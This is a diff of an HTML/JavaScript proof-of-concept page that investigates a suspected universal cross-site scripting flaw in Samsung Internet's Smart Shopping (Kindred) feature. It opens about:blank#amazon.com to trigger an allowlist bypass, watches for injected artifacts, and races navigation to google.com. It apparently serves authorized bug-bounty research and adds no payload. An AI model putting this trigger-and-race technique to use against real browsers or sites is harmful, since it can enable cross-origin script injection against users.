@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Kindred UXSS</title>
+<title>Kindred recon</title>
 <style>
  body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.45;color:#111}
  h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
@@ -13,116 +13,86 @@
  code{background:#eee;padding:1px 5px;border-radius:4px}
  .warn{color:#b23;font-size:11px}
  #banner{display:none;background:#c0392b;color:#fff;padding:12px;border-radius:8px;font-weight:700;font-size:13px;margin-bottom:10px}
- .hide{display:none}
 </style>
 </head>
 <body>
 <div id="banner"></div>
+<h1>Samsung Internet — Kindred / Smart-Shopping recon + race (benign)</h1>
+<p style="font-size:12px;color:#666">Open in <b>Samsung Internet</b>, Smart Shopping ON, allow popups.
+<b>Step 1 is the important one:</b> it opens <code>about:blank#amazon.com</code> (which inherits the opener origin, so we
+can read it) and watches whether Kindred injects any <b>web-context</b> artifact (a global / bridge / DOM node) — and WHEN.
+If step 1 finds nothing, there is no UXSS primitive in this build (likely native-only UI or feature off).</p>
 
-<!-- ================= TRIGGER MODE (origin A = attacker) ================= -->
-<div id="trigUI" class="hide">
- <h1>Samsung Internet — Kindred / Smart-Shopping UXSS (benign)</h1>
- <p style="font-size:12px;color:#666">Authorized research. Open in <b>Samsung Internet</b> with <b>Smart Shopping / Shopping assistant ON</b>.
- This page (origin A) triggers the Kindred allowlist bypass on <code>about:blank#amazon.com</code>, then races a
- navigation to a VICTIM page (origin B — the SAME file with <code>?role=victim</code>). If the async Kindred callback
- lands after the navigation, it injects into origin B — detected there. No third party, no data read.</p>
+<h2>allowlist-bypass trigger URL</h2>
+<input id="trig" value="about:blank#amazon.com">
+<h2>target context (your logic: google.com)</h2>
+<input id="victim" value="https://google.com/">
+<h2>race delay (ms) — set just UNDER the injection time found in step 1</h2>
+<input id="delay" value="120">
 
- <h2>victim URL (target context — per your logic: google.com)</h2>
- <input id="victim" value="https://google.com/">
- <h2>allowlist-bypass trigger URL</h2>
- <input id="trig" value="about:blank#amazon.com">
- <h2>race delay before navigating to victim (ms)</h2>
- <input id="delay" value="120">
- <button onclick="run()">run allowlist-bypass + race</button>
- <button onclick="runLoop()">run x8 (sweep delays 30–240ms)</button>
-</div>
-
-<!-- ================= VICTIM MODE (origin B = target) ================= -->
-<div id="victimUI" class="hide">
- <h1>Benign victim page (origin B)</h1>
- <p style="font-size:12px;color:#666">Stands in for the real target (google.com in the write-up). If Kindred's callback
- — triggered on <code>about:blank#amazon.com</code> in the opener — lands HERE after navigation, it injects into this
- origin. That cross-origin injection is the UXSS primitive. Detection only; no attacker code executed.</p>
- <p>origin(B) = <code id="o"></code> · domain = <code id="d"></code></p>
-</div>
+<button onclick="recon()">1 · RECON — does Kindred inject into about:blank#amazon.com? (readable, timed)</button>
+<button onclick="reconReal()">1b · BASELINE — compare against a REAL allowlisted site (prove feature exists)</button>
+<button onclick="race()">2 · RACE — trigger then navigate to target at delay</button>
 
 <h2>log</h2><pre id="log"></pre>
-<p class="warn">Benign: navigates only your own origins; proof = document.domain + injected-artifact detection on B. Own test build. Report to Samsung Mobile Security Rewards.</p>
+<p class="warn">Benign: no payload is added; we only observe whether/when Samsung's own feature injects into the web context. Own test build. Report to Samsung Mobile Security Rewards.</p>
 
 <script>
 function g(id){return document.getElementById(id);}
 var L=g('log'); function log(m){try{L.textContent=m+'\n'+L.textContent;}catch(e){}}
-var IS_VICTIM = /[?&]role=victim\b/.test(location.search) || /(^|[#&])victim\b/.test(location.hash);
+var RE=/kindred|smart.?shop|shopping|samsung|sbrowser|coupon|cashback|price|assistant|deal|sshop/i;
+var m=/SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
+log('SamsungBrowser='+(m?m[1]:'NOT DETECTED — open in Samsung Internet')+'  origin='+location.origin);
 
-/* =================== VICTIM MODE =================== */
-function startVictim(){
-  g('victimUI').classList.remove('hide');
-  var ORG=location.origin, DOM=document.domain;
-  g('o').textContent=ORG; g('d').textContent=DOM;
-  log('VICTIM loaded. origin='+ORG+' domain='+DOM+' SamsungBrowser='+/SamsungBrowser/.test(navigator.userAgent));
-
-  function report(what){
-    var b=g('banner'); b.style.display='block';
-    b.textContent='⚠ KINDRED / SMART-SHOPPING INJECTED into '+ORG+' (domain='+DOM+') — '+what+
-      '. Navigated here AFTER about:blank#amazon.com triggered the feature => cross-origin injection = UXSS primitive.';
-    document.title='INJECTED '+DOM;
-    log('*** INJECTION DETECTED: '+what+' ***');
-  }
-  var RE=/kindred|smart.?shop|shopping|samsung|sbrowser|coupon|cashback|price|assistant|deal/i;
-
-  // 1) new window globals (Kindred often drops a bridge/global)
-  var base={}; for(var k in window) base[k]=1;
-  setInterval(function(){
-    for(var k in window){ if(!base[k]){ base[k]=1;
-      if(RE.test(k)) report('new global window.'+k); else log('new global (neutral): '+k);
-    } }
-  },150);
-
-  // 2) injected DOM nodes (script/overlay/UI the feature adds)
-  try{
-    new MutationObserver(function(muts){
-      for(var j=0;j<muts.length;j++){ var mn=muts[j].addedNodes;
-        for(var i=0;i<mn.length;i++){ var n=mn[i]; if(n.nodeType!==1) continue;
-          var sig=(n.tagName||'')+' id='+(n.id||'')+' cls='+(n.className||'')+' src='+((n.getAttribute&&n.getAttribute('src'))||'');
-          if(RE.test(sig)) report('injected DOM: '+sig.slice(0,140)); else log('DOM added: '+sig.slice(0,90));
-        }
-      }
-    }).observe(document.documentElement,{childList:true,subtree:true});
-  }catch(e){ log('observer err '+e); }
-  log('watching for cross-origin Kindred injection… (keep this tab open)');
+// ---- watch a child window we control (same-origin) for Kindred web-context injection ----
+function watchChild(w, label){
+  var t0=Date.now(), base={}, found=false;
+  try{ for(var k in w) base[k]=1; }catch(e){}
+  var iv=setInterval(function(){
+    try{
+      var cur = ''+ (w.location && w.location.href);
+      // new globals injected into the child window
+      for(var k in w){ if(!base[k]){ base[k]=1;
+        var hit=RE.test(k);
+        log('+'+(Date.now()-t0)+'ms ['+label+'] new global: '+k+(hit?'  <== KINDRED?':''));
+        if(hit){ found=true; flag(label+' global window.'+k+' @+'+(Date.now()-t0)+'ms'); }
+      } }
+      // injected DOM in the child
+      var root = w.document && w.document.documentElement;
+      var html = root ? root.innerHTML : '';
+      if(html && RE.test(html)){ found=true; var mm=html.match(RE); flag(label+' DOM artifact ("'+(mm&&mm[0])+'") @+'+(Date.now()-t0)+'ms'); log('+'+(Date.now()-t0)+'ms ['+label+'] KINDRED DOM: '+html.slice(0,160)); }
+    }catch(e){
+      log('+'+(Date.now()-t0)+'ms ['+label+'] child now cross-origin / unreadable ('+e+') — stop watch');
+      clearInterval(iv); return;
+    }
+  }, 40);
+  setTimeout(function(){ clearInterval(iv); log('['+label+'] watch ended (12s). kindred web-context injection: '+(found?'YES':'NONE — likely native-only UI or feature off')); }, 12000);
 }
+function flag(msg){ var b=g('banner'); b.style.display='block'; b.textContent='⚠ KINDRED WEB-CONTEXT INJECTION: '+msg+'  — this is the UXSS primitive (readable in about:blank#amazon.com which inherits our origin).'; }
 
-/* =================== TRIGGER MODE (my logic) =================== */
-function startTrigger(){
-  g('trigUI').classList.remove('hide');
-  var m=/SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
-  log('TRIGGER. SamsungBrowser='+(m?m[1]:'NOT DETECTED — open in Samsung Internet')+'  origin(A)='+location.origin);
-}
-
-function fire(trig, victim, delay){
-  var w = window.open(trig, '_blank');          // about:blank#amazon.com -> Kindred allowlist match (bypass)
-  if(!w){ log('popup blocked — allow popups'); return; }
-  log('opened "'+trig+'" (allowlist bypass). Kindred schedules async native callback. nav->victim in '+delay+'ms');
-  setTimeout(function(){
-    try{ w.location.href = victim; log('  navigated child to origin B. If callback arrives NOW => injects into B = UXSS'); }
-    catch(e){ log('  nav err '+e); }
-  }, delay);
-}
-function run(){
-  fire((g('trig').value||'about:blank#amazon.com').trim(),
-       (g('victim').value||'').trim(),
-       Math.max(0,parseInt(g('delay').value||'120',10)||120));
-}
-function runLoop(){
+function recon(){
   var trig=(g('trig').value||'about:blank#amazon.com').trim();
-  var victim=(g('victim').value||'').trim();
-  var delays=[30,60,90,120,150,180,210,240], k=0;
-  log('sweeping race delays '+delays.join(',')+' (one child per 1.5s)…');
-  var iv=setInterval(function(){ if(k>=delays.length){clearInterval(iv);log('sweep done');return;} fire(trig,victim,delays[k++]); },1500);
+  var w=window.open(trig,'_blank');
+  if(!w){ log('popup blocked'); return; }
+  log('RECON: opened '+trig+' (inherits our origin -> readable). watching for Kindred injection + timing…');
+  watchChild(w,'bypass');
 }
-
-/* =================== dispatch =================== */
-if(IS_VICTIM) startVictim(); else startTrigger();
+function reconReal(){
+  var w=window.open('https://www.amazon.com/','_blank');
+  if(!w){ log('popup blocked'); return; }
+  log('BASELINE: opened REAL amazon.com. (will go cross-origin once it loads, but watch for any same-origin window before commit / native UI). If NOTHING injects on real amazon either, Smart Shopping is off/native-only here.');
+  watchChild(w,'real-amazon');
+}
+function race(){
+  var trig=(g('trig').value||'about:blank#amazon.com').trim();
+  var victim=(g('victim').value||'https://google.com/').trim();
+  var delay=Math.max(0,parseInt(g('delay').value||'120',10)||120);
+  var w=window.open(trig,'_blank');
+  if(!w){ log('popup blocked'); return; }
+  log('RACE: opened '+trig+'. navigating child to '+victim+' in '+delay+'ms');
+  watchChild(w,'race');   // keep watching across the navigation (until cross-origin)
+  setTimeout(function(){ try{ w.location.href=victim; log('  navigated child to '+victim+'. If a Kindred overlay appears ON that page = cross-origin injection (watch the tab).'); }catch(e){ log('nav err '+e);} }, delay);
+}
 </script>
 </body>
 </html>
